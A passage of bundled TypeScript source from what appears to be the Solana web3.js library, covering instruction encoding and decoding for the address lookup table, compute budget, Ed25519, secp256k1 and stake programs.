CreateLookupTable: {\n    index: 0,\n    layout: BufferLayout.struct<\n      LookupTableInstructionInputData['CreateLookupTable']\n    >([\n      BufferLayout.u32('instruction'),\n      bigintLayout.u64('recentSlot'),\n      BufferLayout.u8('bumpSeed'),\n    ]),\n  },\n  FreezeLookupTable: {\n    index: 1,\n    layout: BufferLayout.struct<\n      LookupTableInstructionInputData['FreezeLookupTable']\n    >([BufferLayout.u32('instruction')]),\n  },\n  ExtendLookupTable: {\n    index: 2,\n    layout: BufferLayout.struct<\n      LookupTableInstructionInputData['ExtendLookupTable']\n    >([\n      BufferLayout.u32('instruction'),\n      bigintLayout.u64(),\n      BufferLayout.seq(\n        Layout.publicKey(),\n        BufferLayout.offset(BufferLayout.u32(), -8),\n        'addresses',\n      ),\n    ]),\n  },\n  DeactivateLookupTable: {\n    index: 3,\n    layout: BufferLayout.struct<\n      LookupTableInstructionInputData['DeactivateLookupTable']\n    >([BufferLayout.u32('instruction')]),\n  },\n  CloseLookupTable: {\n    index: 4,\n    layout: BufferLayout.struct<\n      LookupTableInstructionInputData['CloseLookupTable']\n    >([BufferLayout.u32('instruction')]),\n  },\n});\n\nexport class AddressLookupTableInstruction {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  static decodeInstructionType(\n    instruction: TransactionInstruction,\n  ): LookupTableInstructionType {\n    this.checkProgramId(instruction.programId);\n\n    const instructionTypeLayout = BufferLayout.u32('instruction');\n    const index = instructionTypeLayout.decode(instruction.data);\n\n    let type: LookupTableInstructionType | undefined;\n    for (const [layoutType, layout] of Object.entries(\n      LOOKUP_TABLE_INSTRUCTION_LAYOUTS,\n    )) {\n      if ((layout as any).index == index) {\n        type = layoutType as LookupTableInstructionType;\n        break;\n      }\n    }\n    if (!type) {\n      throw new Error(\n        'Invalid Instruction. Should be a LookupTable Instruction',\n      );\n    }\n    return type;\n  }\n\n  static decodeCreateLookupTable(\n    instruction: TransactionInstruction,\n  ): CreateLookupTableParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeysLength(instruction.keys, 4);\n\n    const {recentSlot} = decodeData(\n      LOOKUP_TABLE_INSTRUCTION_LAYOUTS.CreateLookupTable,\n      instruction.data,\n    );\n\n    return {\n      authority: instruction.keys[1].pubkey,\n      payer: instruction.keys[2].pubkey,\n      recentSlot: Number(recentSlot),\n    };\n  }\n\n  static decodeExtendLookupTable(\n    instruction: TransactionInstruction,\n  ): ExtendLookupTableParams {\n    this.checkProgramId(instruction.programId);\n    if (instruction.keys.length < 2) {\n      throw new Error(\n        `invalid instruction; found ${instruction.keys.length} keys, expected at least 2`,\n      );\n    }\n\n    const {addresses} = decodeData(\n      LOOKUP_TABLE_INSTRUCTION_LAYOUTS.ExtendLookupTable,\n      instruction.data,\n    );\n    return {\n      lookupTable: instruction.keys[0].pubkey,\n      authority: instruction.keys[1].pubkey,\n      payer:\n        instruction.keys.length > 2 ? instruction.keys[2].pubkey : undefined,\n      addresses: addresses.map(buffer => new PublicKey(buffer)),\n    };\n  }\n\n  static decodeCloseLookupTable(\n    instruction: TransactionInstruction,\n  ): CloseLookupTableParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeysLength(instruction.keys, 3);\n\n    return {\n      lookupTable: instruction.keys[0].pubkey,\n      authority: instruction.keys[1].pubkey,\n      recipient: instruction.keys[2].pubkey,\n    };\n  }\n\n  static decodeFreezeLookupTable(\n    instruction: TransactionInstruction,\n  ): FreezeLookupTableParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeysLength(instruction.keys, 2);\n\n    return {\n      lookupTable: instruction.keys[0].pubkey,\n      authority: instruction.keys[1].pubkey,\n    };\n  }\n\n  static decodeDeactivateLookupTable(\n    instruction: TransactionInstruction,\n  ): DeactivateLookupTableParams {\n    this.checkProgramId(instruction.programId);\n    this.checkKeysLength(instruction.keys, 2);\n\n    return {\n      lookupTable: instruction.keys[0].pubkey,\n      authority: instruction.keys[1].pubkey,\n    };\n  }\n\n  /**\n   * @internal\n   */\n  static checkProgramId(programId: PublicKey) {\n    if (!programId.equals(AddressLookupTableProgram.programId)) {\n      throw new Error(\n        'invalid instruction; programId is not AddressLookupTable Program',\n      );\n    }\n  }\n  /**\n   * @internal\n   */\n  static checkKeysLength(keys: Array<any>, expectedLength: number) {\n    if (keys.length < expectedLength) {\n      throw new Error(\n        `invalid instruction; found ${keys.length} keys, expected at least ${expectedLength}`,\n      );\n    }\n  }\n}\n\nexport class AddressLookupTableProgram {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  static programId: PublicKey = new PublicKey(\n    'AddressLookupTab1e1111111111111111111111111',\n  );\n\n  static createLookupTable(params: CreateLookupTableParams) {\n    const [lookupTableAddress, bumpSeed] = PublicKey.findProgramAddressSync(\n      [params.authority.toBuffer(), toBufferLE(BigInt(params.recentSlot), 8)],\n      this.programId,\n    );\n\n    const type = LOOKUP_TABLE_INSTRUCTION_LAYOUTS.CreateLookupTable;\n    const data = encodeData(type, {\n      recentSlot: BigInt(params.recentSlot),\n      bumpSeed: bumpSeed,\n    });\n\n    const keys = [\n      {\n        pubkey: lookupTableAddress,\n        isSigner: false,\n        isWritable: true,\n      },\n      {\n        pubkey: params.authority,\n        isSigner: true,\n        isWritable: false,\n      },\n      {\n        pubkey: params.payer,\n        isSigner: true,\n        isWritable: true,\n      },\n      {\n        pubkey: SystemProgram.programId,\n        isSigner: false,\n        isWritable: false,\n      },\n    ];\n\n    return [\n      new TransactionInstruction({\n        programId: this.programId,\n        keys: keys,\n        data: data,\n      }),\n      lookupTableAddress,\n    ] as [TransactionInstruction, PublicKey];\n  }\n\n  static freezeLookupTable(params: FreezeLookupTableParams) {\n    const type = LOOKUP_TABLE_INSTRUCTION_LAYOUTS.FreezeLookupTable;\n    const data = encodeData(type);\n\n    const keys = [\n      {\n        pubkey: params.lookupTable,\n        isSigner: false,\n        isWritable: true,\n      },\n      {\n        pubkey: params.authority,\n        isSigner: true,\n        isWritable: false,\n      },\n    ];\n\n    return new TransactionInstruction({\n      programId: this.programId,\n      keys: keys,\n      data: data,\n    });\n  }\n\n  static extendLookupTable(params: ExtendLookupTableParams) {\n    const type = LOOKUP_TABLE_INSTRUCTION_LAYOUTS.ExtendLookupTable;\n    const data = encodeData(type, {\n      addresses: params.addresses.map(addr => addr.toBytes()),\n    });\n\n    const keys = [\n      {\n        pubkey: params.lookupTable,\n        isSigner: false,\n        isWritable: true,\n      },\n      {\n        pubkey: params.authority,\n        isSigner: true,\n        isWritable: false,\n      },\n    ];\n\n    if (params.payer) {\n      keys.push(\n        {\n          pubkey: params.payer,\n          isSigner: true,\n          isWritable: true,\n        },\n        {\n          pubkey: SystemProgram.programId,\n          isSigner: false,\n          isWritable: false,\n        },\n      );\n    }\n\n    return new TransactionInstruction({\n      programId: this.programId,\n      keys: keys,\n      data: data,\n    });\n  }\n\n  static deactivateLookupTable(params: DeactivateLookupTableParams) {\n    const type = LOOKUP_TABLE_INSTRUCTION_LAYOUTS.DeactivateLookupTable;\n    const data = encodeData(type);\n\n    const keys = [\n      {\n        pubkey: params.lookupTable,\n        isSigner: false,\n        isWritable: true,\n      },\n      {\n        pubkey: params.authority,\n        isSigner: true,\n        isWritable: false,\n      },\n    ];\n\n    return new TransactionInstruction({\n      programId: this.programId,\n      keys: keys,\n      data: data,\n    });\n  }\n\n  static closeLookupTable(params: CloseLookupTableParams) {\n    const type = LOOKUP_TABLE_INSTRUCTION_LAYOUTS.CloseLookupTable;\n    const data = encodeData(type);\n\n    const keys = [\n      {\n        pubkey: params.lookupTable,\n        isSigner: false,\n        isWritable: true,\n      },\n      {\n        pubkey: params.authority,\n        isSigner: true,\n        isWritable: false,\n      },\n      {\n        pubkey: params.recipient,\n        isSigner: false,\n        isWritable: true,\n      },\n    ];\n\n    return new TransactionInstruction({\n      programId: this.programId,\n      keys: keys,\n      data: data,\n    });\n  }\n}\n","import * as BufferLayout from '@solana/buffer-layout';\n\nimport {\n  encodeData,\n  decodeData,\n  InstructionType,\n  IInstructionInputData,\n} from '../instruction';\nimport {PublicKey} from '../publickey';\nimport {TransactionInstruction} from '../transaction';\nimport {u64} from '../utils/bigint';\n\n/**\n * Compute Budget Instruction class\n */\nexport class ComputeBudgetInstruction {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Decode a compute budget instruction and retrieve the instruction type.\n   */\n  static decodeInstructionType(\n    instruction: TransactionInstruction,\n  ): ComputeBudgetInstructionType {\n    this.checkProgramId(instruction.programId);\n\n    const instructionTypeLayout = BufferLayout.u8('instruction');\n    const typeIndex = instructionTypeLayout.decode(instruction.data);\n\n    let type: ComputeBudgetInstructionType | undefined;\n    for (const [ixType, layout] of Object.entries(\n      COMPUTE_BUDGET_INSTRUCTION_LAYOUTS,\n    )) {\n      if (layout.index == typeIndex) {\n        type = ixType as ComputeBudgetInstructionType;\n        break;\n      }\n    }\n\n    if (!type) {\n      throw new Error(\n        'Instruction type incorrect; not a ComputeBudgetInstruction',\n      );\n    }\n\n    return type;\n  }\n\n  /**\n   * Decode request units compute budget instruction and retrieve the instruction params.\n   */\n  static decodeRequestUnits(\n    instruction: TransactionInstruction,\n  ): RequestUnitsParams {\n    this.checkProgramId(instruction.programId);\n    const {units, additionalFee} = decodeData(\n      COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.RequestUnits,\n      instruction.data,\n    );\n    return {units, additionalFee};\n  }\n\n  /**\n   * Decode request heap frame compute budget instruction and retrieve the instruction params.\n   */\n  static decodeRequestHeapFrame(\n    instruction: TransactionInstruction,\n  ): RequestHeapFrameParams {\n    this.checkProgramId(instruction.programId);\n    const {bytes} = decodeData(\n      COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.RequestHeapFrame,\n      instruction.data,\n    );\n    return {bytes};\n  }\n\n  /**\n   * Decode set compute unit limit compute budget instruction and retrieve the instruction params.\n   */\n  static decodeSetComputeUnitLimit(\n    instruction: TransactionInstruction,\n  ): SetComputeUnitLimitParams {\n    this.checkProgramId(instruction.programId);\n    const {units} = decodeData(\n      COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.SetComputeUnitLimit,\n      instruction.data,\n    );\n    return {units};\n  }\n\n  /**\n   * Decode set compute unit price compute budget instruction and retrieve the instruction params.\n   */\n  static decodeSetComputeUnitPrice(\n    instruction: TransactionInstruction,\n  ): SetComputeUnitPriceParams {\n    this.checkProgramId(instruction.programId);\n    const {microLamports} = decodeData(\n      COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.SetComputeUnitPrice,\n      instruction.data,\n    );\n    return {microLamports};\n  }\n\n  /**\n   * @internal\n   */\n  static checkProgramId(programId: PublicKey) {\n    if (!programId.equals(ComputeBudgetProgram.programId)) {\n      throw new Error(\n        'invalid instruction; programId is not ComputeBudgetProgram',\n      );\n    }\n  }\n}\n\n/**\n * An enumeration of valid ComputeBudgetInstructionType's\n */\nexport type ComputeBudgetInstructionType =\n  // FIXME\n  // It would be preferable for this type to be `keyof ComputeBudgetInstructionInputData`\n  // but Typedoc does not transpile `keyof` expressions.\n  // See https://github.com/TypeStrong/typedoc/issues/1894\n  | 'RequestUnits'\n  | 'RequestHeapFrame'\n  | 'SetComputeUnitLimit'\n  | 'SetComputeUnitPrice';\n\ntype ComputeBudgetInstructionInputData = {\n  RequestUnits: IInstructionInputData & Readonly<RequestUnitsParams>;\n  RequestHeapFrame: IInstructionInputData & Readonly<RequestHeapFrameParams>;\n  SetComputeUnitLimit: IInstructionInputData &\n    Readonly<SetComputeUnitLimitParams>;\n  SetComputeUnitPrice: IInstructionInputData &\n    Readonly<SetComputeUnitPriceParams>;\n};\n\n/**\n * Request units instruction params\n */\nexport interface RequestUnitsParams {\n  /** Units to request for transaction-wide compute */\n  units: number;\n  /** Prioritization fee lamports */\n  additionalFee: number;\n}\n\n/**\n * Request heap frame instruction params\n */\nexport type RequestHeapFrameParams = {\n  /** Requested transaction-wide program heap size in bytes. Must be multiple of 1024. Applies to each program, including CPIs. */\n  bytes: number;\n};\n\n/**\n * Set compute unit limit instruction params\n */\nexport interface SetComputeUnitLimitParams {\n  /** Transaction-wide compute unit limit */\n  units: number;\n}\n\n/**\n * Set compute unit price instruction params\n */\nexport interface SetComputeUnitPriceParams {\n  /** Transaction compute unit price used for prioritization fees */\n  microLamports: number | bigint;\n}\n\n/**\n * An enumeration of valid ComputeBudget InstructionType's\n * @internal\n */\nexport const COMPUTE_BUDGET_INSTRUCTION_LAYOUTS = Object.freeze<{\n  [Instruction in ComputeBudgetInstructionType]: InstructionType<\n    ComputeBudgetInstructionInputData[Instruction]\n  >;\n}>({\n  RequestUnits: {\n    index: 0,\n    layout: BufferLayout.struct<\n      ComputeBudgetInstructionInputData['RequestUnits']\n    >([\n      BufferLayout.u8('instruction'),\n      BufferLayout.u32('units'),\n      BufferLayout.u32('additionalFee'),\n    ]),\n  },\n  RequestHeapFrame: {\n    index: 1,\n    layout: BufferLayout.struct<\n      ComputeBudgetInstructionInputData['RequestHeapFrame']\n    >([BufferLayout.u8('instruction'), BufferLayout.u32('bytes')]),\n  },\n  SetComputeUnitLimit: {\n    index: 2,\n    layout: BufferLayout.struct<\n      ComputeBudgetInstructionInputData['SetComputeUnitLimit']\n    >([BufferLayout.u8('instruction'), BufferLayout.u32('units')]),\n  },\n  SetComputeUnitPrice: {\n    index: 3,\n    layout: BufferLayout.struct<\n      ComputeBudgetInstructionInputData['SetComputeUnitPrice']\n    >([BufferLayout.u8('instruction'), u64('microLamports')]),\n  },\n});\n\n/**\n * Factory class for transaction instructions to interact with the Compute Budget program\n */\nexport class ComputeBudgetProgram {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Public key that identifies the Compute Budget program\n   */\n  static programId: PublicKey = new PublicKey(\n    'ComputeBudget111111111111111111111111111111',\n  );\n\n  /**\n   * @deprecated Instead, call {@link setComputeUnitLimit} and/or {@link setComputeUnitPrice}\n   */\n  static requestUnits(params: RequestUnitsParams): TransactionInstruction {\n    const type = COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.RequestUnits;\n    const data = encodeData(type, params);\n    return new TransactionInstruction({\n      keys: [],\n      programId: this.programId,\n      data,\n    });\n  }\n\n  static requestHeapFrame(\n    params: RequestHeapFrameParams,\n  ): TransactionInstruction {\n    const type = COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.RequestHeapFrame;\n    const data = encodeData(type, params);\n    return new TransactionInstruction({\n      keys: [],\n      programId: this.programId,\n      data,\n    });\n  }\n\n  static setComputeUnitLimit(\n    params: SetComputeUnitLimitParams,\n  ): TransactionInstruction {\n    const type = COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.SetComputeUnitLimit;\n    const data = encodeData(type, params);\n    return new TransactionInstruction({\n      keys: [],\n      programId: this.programId,\n      data,\n    });\n  }\n\n  static setComputeUnitPrice(\n    params: SetComputeUnitPriceParams,\n  ): TransactionInstruction {\n    const type = COMPUTE_BUDGET_INSTRUCTION_LAYOUTS.SetComputeUnitPrice;\n    const data = encodeData(type, {\n      microLamports: BigInt(params.microLamports),\n    });\n    return new TransactionInstruction({\n      keys: [],\n      programId: this.programId,\n      data,\n    });\n  }\n}\n","import {Buffer} from 'buffer';\nimport * as BufferLayout from '@solana/buffer-layout';\n\nimport {Keypair} from '../keypair';\nimport {PublicKey} from '../publickey';\nimport {TransactionInstruction} from '../transaction';\nimport assert from '../utils/assert';\nimport {sign} from '../utils/ed25519';\n\nconst PRIVATE_KEY_BYTES = 64;\nconst PUBLIC_KEY_BYTES = 32;\nconst SIGNATURE_BYTES = 64;\n\n/**\n * Params for creating an ed25519 instruction using a public key\n */\nexport type CreateEd25519InstructionWithPublicKeyParams = {\n  publicKey: Uint8Array;\n  message: Uint8Array;\n  signature: Uint8Array;\n  instructionIndex?: number;\n};\n\n/**\n * Params for creating an ed25519 instruction using a private key\n */\nexport type CreateEd25519InstructionWithPrivateKeyParams = {\n  privateKey: Uint8Array;\n  message: Uint8Array;\n  instructionIndex?: number;\n};\n\nconst ED25519_INSTRUCTION_LAYOUT = BufferLayout.struct<\n  Readonly<{\n    messageDataOffset: number;\n    messageDataSize: number;\n    messageInstructionIndex: number;\n    numSignatures: number;\n    padding: number;\n    publicKeyInstructionIndex: number;\n    publicKeyOffset: number;\n    signatureInstructionIndex: number;\n    signatureOffset: number;\n  }>\n>([\n  BufferLayout.u8('numSignatures'),\n  BufferLayout.u8('padding'),\n  BufferLayout.u16('signatureOffset'),\n  BufferLayout.u16('signatureInstructionIndex'),\n  BufferLayout.u16('publicKeyOffset'),\n  BufferLayout.u16('publicKeyInstructionIndex'),\n  BufferLayout.u16('messageDataOffset'),\n  BufferLayout.u16('messageDataSize'),\n  BufferLayout.u16('messageInstructionIndex'),\n]);\n\nexport class Ed25519Program {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Public key that identifies the ed25519 program\n   */\n  static programId: PublicKey = new PublicKey(\n    'Ed25519SigVerify111111111111111111111111111',\n  );\n\n  /**\n   * Create an ed25519 instruction with a public key and signature. The\n   * public key must be a buffer that is 32 bytes long, and the signature\n   * must be a buffer of 64 bytes.\n   */\n  static createInstructionWithPublicKey(\n    params: CreateEd25519InstructionWithPublicKeyParams,\n  ): TransactionInstruction {\n    const {publicKey, message, signature, instructionIndex} = params;\n\n    assert(\n      publicKey.length === PUBLIC_KEY_BYTES,\n      `Public Key must be ${PUBLIC_KEY_BYTES} bytes but received ${publicKey.length} bytes`,\n    );\n\n    assert(\n      signature.length === SIGNATURE_BYTES,\n      `Signature must be ${SIGNATURE_BYTES} bytes but received ${signature.length} bytes`,\n    );\n\n    const publicKeyOffset = ED25519_INSTRUCTION_LAYOUT.span;\n    const signatureOffset = publicKeyOffset + publicKey.length;\n    const messageDataOffset = signatureOffset + signature.length;\n    const numSignatures = 1;\n\n    const instructionData = Buffer.alloc(messageDataOffset + message.length);\n\n    const index =\n      instructionIndex == null\n        ? 0xffff // An index of `u16::MAX` makes it default to the current instruction.\n        : instructionIndex;\n\n    ED25519_INSTRUCTION_LAYOUT.encode(\n      {\n        numSignatures,\n        padding: 0,\n        signatureOffset,\n        signatureInstructionIndex: index,\n        publicKeyOffset,\n        publicKeyInstructionIndex: index,\n        messageDataOffset,\n        messageDataSize: message.length,\n        messageInstructionIndex: index,\n      },\n      instructionData,\n    );\n\n    instructionData.fill(publicKey, publicKeyOffset);\n    instructionData.fill(signature, signatureOffset);\n    instructionData.fill(message, messageDataOffset);\n\n    return new TransactionInstruction({\n      keys: [],\n      programId: Ed25519Program.programId,\n      data: instructionData,\n    });\n  }\n\n  /**\n   * Create an ed25519 instruction with a private key. The private key\n   * must be a buffer that is 64 bytes long.\n   */\n  static createInstructionWithPrivateKey(\n    params: CreateEd25519InstructionWithPrivateKeyParams,\n  ): TransactionInstruction {\n    const {privateKey, message, instructionIndex} = params;\n\n    assert(\n      privateKey.length === PRIVATE_KEY_BYTES,\n      `Private key must be ${PRIVATE_KEY_BYTES} bytes but received ${privateKey.length} bytes`,\n    );\n\n    try {\n      const keypair = Keypair.fromSecretKey(privateKey);\n      const publicKey = keypair.publicKey.toBytes();\n      const signature = sign(message, keypair.secretKey);\n\n      return this.createInstructionWithPublicKey({\n        publicKey,\n        message,\n        signature,\n        instructionIndex,\n      });\n    } catch (error) {\n      throw new Error(`Error creating instruction; ${error}`);\n    }\n  }\n}\n","import {secp256k1} from '@noble/curves/secp256k1';\n\nexport const ecdsaSign = (\n  msgHash: Parameters<typeof secp256k1.sign>[0],\n  privKey: Parameters<typeof secp256k1.sign>[1],\n) => {\n  const signature = secp256k1.sign(msgHash, privKey);\n  return [signature.toCompactRawBytes(), signature.recovery!] as const;\n};\nexport const isValidPrivateKey = secp256k1.utils.isValidPrivateKey;\nexport const publicKeyCreate = secp256k1.getPublicKey;\n","import {Buffer} from 'buffer';\nimport * as BufferLayout from '@solana/buffer-layout';\nimport {keccak_256} from '@noble/hashes/sha3';\n\nimport {PublicKey} from '../publickey';\nimport {TransactionInstruction} from '../transaction';\nimport assert from '../utils/assert';\nimport {publicKeyCreate, ecdsaSign} from '../utils/secp256k1';\nimport {toBuffer} from '../utils/to-buffer';\n\nconst PRIVATE_KEY_BYTES = 32;\nconst ETHEREUM_ADDRESS_BYTES = 20;\nconst PUBLIC_KEY_BYTES = 64;\nconst SIGNATURE_OFFSETS_SERIALIZED_SIZE = 11;\n\n/**\n * Params for creating an secp256k1 instruction using a public key\n */\nexport type CreateSecp256k1InstructionWithPublicKeyParams = {\n  publicKey: Buffer | Uint8Array | Array<number>;\n  message: Buffer | Uint8Array | Array<number>;\n  signature: Buffer | Uint8Array | Array<number>;\n  recoveryId: number;\n  instructionIndex?: number;\n};\n\n/**\n * Params for creating an secp256k1 instruction using an Ethereum address\n */\nexport type CreateSecp256k1InstructionWithEthAddressParams = {\n  ethAddress: Buffer | Uint8Array | Array<number> | string;\n  message: Buffer | Uint8Array | Array<number>;\n  signature: Buffer | Uint8Array | Array<number>;\n  recoveryId: number;\n  instructionIndex?: number;\n};\n\n/**\n * Params for creating an secp256k1 instruction using a private key\n */\nexport type CreateSecp256k1InstructionWithPrivateKeyParams = {\n  privateKey: Buffer | Uint8Array | Array<number>;\n  message: Buffer | Uint8Array | Array<number>;\n  instructionIndex?: number;\n};\n\nconst SECP256K1_INSTRUCTION_LAYOUT = BufferLayout.struct<\n  Readonly<{\n    ethAddress: Uint8Array;\n    ethAddressInstructionIndex: number;\n    ethAddressOffset: number;\n    messageDataOffset: number;\n    messageDataSize: number;\n    messageInstructionIndex: number;\n    numSignatures: number;\n    recoveryId: number;\n    signature: Uint8Array;\n    signatureInstructionIndex: number;\n    signatureOffset: number;\n  }>\n>([\n  BufferLayout.u8('numSignatures'),\n  BufferLayout.u16('signatureOffset'),\n  BufferLayout.u8('signatureInstructionIndex'),\n  BufferLayout.u16('ethAddressOffset'),\n  BufferLayout.u8('ethAddressInstructionIndex'),\n  BufferLayout.u16('messageDataOffset'),\n  BufferLayout.u16('messageDataSize'),\n  BufferLayout.u8('messageInstructionIndex'),\n  BufferLayout.blob(20, 'ethAddress'),\n  BufferLayout.blob(64, 'signature'),\n  BufferLayout.u8('recoveryId'),\n]);\n\nexport class Secp256k1Program {\n  /**\n   * @internal\n   */\n  constructor() {}\n\n  /**\n   * Public key that identifies the secp256k1 program\n   */\n  static programId: PublicKey = new PublicKey(\n    'KeccakSecp256k11111111111111111111111111111',\n  );\n\n  /**\n   * Construct an Ethereum address from a secp256k1 public key buffer.\n   * @param {Buffer} publicKey a 64 byte secp256k1 public key buffer\n   */\n  static publicKeyToEthAddress(\n    publicKey: Buffer | Uint8Array | Array<number>,\n  ): Buffer {\n    assert(\n      publicKey.length === PUBLIC_KEY_BYTES,\n      `Public key must be ${PUBLIC_KEY_BYTES} bytes but received ${publicKey.length} bytes`,\n    );\n\n    try {\n      return Buffer.from(keccak_256(toBuffer(publicKey))).slice(\n        -ETHEREUM_ADDRESS_BYTES,\n      );\n    } catch (error) {\n      throw new Error(`Error constructing Ethereum address: ${error}`);\n    }\n  }\n\n  /**\n   * Create an secp256k1 instruction with a public key. The public key\n   * must be a buffer that is 64 bytes long.\n   */\n  static createInstructionWithPublicKey(\n    params: CreateSecp256k1InstructionWithPublicKeyParams,\n  ): TransactionInstruction {\n    const {publicKey, message, signature, recoveryId, instructionIndex} =\n      params;\n    return Secp256k1Program.createInstructionWithEthAddress({\n      ethAddress: Secp256k1Program.publicKeyToEthAddress(publicKey),\n      message,\n      signature,\n      recoveryId,\n      instructionIndex,\n    });\n  }\n\n  /**\n   * Create an secp256k1 instruction with an Ethereum address. The address\n   * must be a hex string or a buffer that is 20 bytes long.\n   */\n  static createInstructionWithEthAddress(\n    params: CreateSecp256k1InstructionWithEthAddressParams,\n  ): TransactionInstruction {\n    const {\n      ethAddress: rawAddress,\n      message,\n      signature,\n      recoveryId,\n      instructionIndex = 0,\n    } = params;\n\n    let ethAddress;\n    if (typeof rawAddress === 'string') {\n      if (rawAddress.startsWith('0x')) {\n        ethAddress = Buffer.from(rawAddress.substr(2), 'hex');\n      } else {\n        ethAddress = Buffer.from(rawAddress, 'hex');\n      }\n    } else {\n      ethAddress = rawAddress;\n    }\n\n    assert(\n      ethAddress.length === ETHEREUM_ADDRESS_BYTES,\n      `Address must be ${ETHEREUM_ADDRESS_BYTES} bytes but received ${ethAddress.length} bytes`,\n    );\n\n    const dataStart = 1 + SIGNATURE_OFFSETS_SERIALIZED_SIZE;\n    const ethAddressOffset = dataStart;\n    const signatureOffset = dataStart + ethAddress.length;\n    const messageDataOffset = signatureOffset + signature.length + 1;\n    const numSignatures = 1;\n\n    const instructionData = Buffer.alloc(\n      SECP256K1_INSTRUCTION_LAYOUT.span + message.length,\n    );\n\n    SECP256K1_INSTRUCTION_LAYOUT.encode(\n      {\n        numSignatures,\n        signatureOffset,\n        signatureInstructionIndex: instructionIndex,\n        ethAddressOffset,\n        ethAddressInstructionIndex: instructionIndex,\n        messageDataOffset,\n        messageDataSize: message.length,\n        messageInstructionIndex: instructionIndex,\n        signature: toBuffer(signature),\n        ethAddress: toBuffer(ethAddress),\n        recoveryId,\n      },\n      instructionData,\n    );\n\n    instructionData.fill(toBuffer(message), SECP256K1_INSTRUCTION_LAYOUT.span);\n\n    return new TransactionInstruction({\n      keys: [],\n      programId: Secp256k1Program.programId,\n      data: instructionData,\n    });\n  }\n\n  /**\n   * Create an secp256k1 instruction with a private key. The private key\n   * must be a buffer that is 32 bytes long.\n   */\n  static createInstructionWithPrivateKey(\n    params: CreateSecp256k1InstructionWithPrivateKeyParams,\n  ): TransactionInstruction {\n    const {privateKey: pkey, message, instructionIndex} = params;\n\n    assert(\n      pkey.length === PRIVATE_KEY_BYTES,\n      `Private key must be ${PRIVATE_KEY_BYTES} bytes but received ${pkey.length} bytes`,\n    );\n\n    try {\n      const privateKey = toBuffer(pkey);\n      const publicKey = publicKeyCreate(\n        privateKey,\n        false /* isCompressed */,\n      ).slice(1); // throw away leading byte\n      const messageHash = Buffer.from(keccak_256(toBuffer(message)));\n      const [signature, recoveryId] = ecdsaSign(messageHash, privateKey);\n\n      return this.createInstructionWithPublicKey({\n        publicKey,\n        message,\n        signature,\n        recoveryId,\n        instructionIndex,\n      });\n    } catch (error) {\n      throw new Error(`Error creating instruction; ${error}`);\n    }\n  }\n}\n","import * as BufferLayout from '@solana/buffer-layout';\n\nimport {\n  encodeData,\n  decodeData,\n  InstructionType,\n  IInstructionInputData,\n} from '../instruction';\nimport * as Layout from '../layout';\nimport {PublicKey} from '../publickey';\nimport {SystemProgram} from './system';\nimport {\n  SYSVAR_CLOCK_PUBKEY,\n  SYSVAR_RENT_PUBKEY,\n  SYSVAR_STAKE_HISTORY_PUBKEY,\n} from '../sysvar';\nimport {Transaction, TransactionInstruction} from '../transaction';\nimport {toBuffer} from '../utils/to-buffer';\n\n/**\n * Address of the stake config account which configures the rate\n * of stake warmup and cooldown as well as the slashing penalty.\n */\nexport const STAKE_CONFIG_ID = new PublicKey(\n  'StakeConfig11111111111111111111111111111111',\n);\n\n/**\n * Stake account authority info\n */\nexport class Authorized {\n  /** stake authority */\n  staker: PublicKey;\n  /** withdraw authority */\n  withdrawer: PublicKey;\n\n  /**\n   * Create a new Authorized object\n   * @param staker the stake authority\n   * @param withdrawer the withdraw authority\n   */\n  constructor(staker: PublicKey, withdrawer: PublicKey) {\n    this.staker = staker;\n    this.withdrawer = withdrawer;\n  }\n}\n\ntype AuthorizedRaw = Readonly<{\n  staker: Uint8Array;\n  withdrawer: Uint8Array;\n}>;\n\n/**\n * Stake account lockup info\n */\nexport class Lockup {\n  /** Unix timestamp of lockup expiration */\n  unixTimestamp: number;\n  /** Epoch of lockup expiration */\n  epoch: number;\n  /** Lockup custodian authority */\n  custodian: PublicKey;\n\n  /**\n   * Create a new Lockup object\n   */\n  constructor(unixTimestamp: number, epoch: number, custodian: PublicKey) {\n    this.unixTimestamp = unixTimestamp;\n    this.epoch = epoch;\n    this.custodian = custodian;\n  }\n\n  /**\n   * Default, inactive Lockup value\n   */\n  static default: Lockup = new Lockup(0, 0, PublicKey.default);\n}\n\ntype LockupRaw = Readonly<{\n  custodian: Uint8Array;\n  epoch: number;\n  unixTimestamp: number;\n}>;\n\n/**\n * Create stake account transaction params\n */\nexport type CreateStakeAccountParams = {\n  /** Address of the account which will fund creation */\n  fromPubkey: PublicKey;\n  /** Address of the new stake account */\n  stakePubkey: PublicKey;\n  /** Authorities of the new stake account */\n  authorized: Authorized;\n  /** Lockup of the new stake account */\n  lockup?: Lockup;\n  /** Funding amount */\n  lamports: number;\n};\n\n/**\n * Create stake account with seed transaction params\n */\nexport type CreateStakeAccountWithSeedParams = {\n  fromPubkey: PublicKey;\n  stakePubkey: PublicKey;\n  basePubkey: PublicKey;\n  seed: string;\n  authorized: Authorized;\n  lockup?: Lockup;\n  lamports: number;\n};\n\n/**\n * Initialize stake instruction params\n */\nexport type InitializeStakeParams = {\n  stakePubkey: PublicKey;\n  authorized: Authorized;\n  lockup?: Lockup;\n};\n\n/**\n * Delegate stake instruction params\n */\nexport type DelegateStakeParams = {\n  stakePubkey: PublicKey;\n  authorizedPubkey: PublicKey;\n  votePubkey: PublicKey;\n};\n\n/**\n * Authorize stake instruction params\n */\nexport type AuthorizeStakeParams = {\n  stakePubkey: PublicKey;\n  authorizedPubkey: PublicKey;\n  newAuthorizedPubkey: PublicKey;\n  stakeAuthorizationType: StakeAuthorizationType;\n  custodianPubkey?: PublicKey;\n};\n\n/**\n * Authorize stake instruction params using a derived key\n */\nexport type AuthorizeWithSeedStakeParams = {\n  stakePubkey: PublicKey;\n  authorityBase: PublicKey;\n  authoritySeed: string;\n  authorityOwner: PublicKey;\n  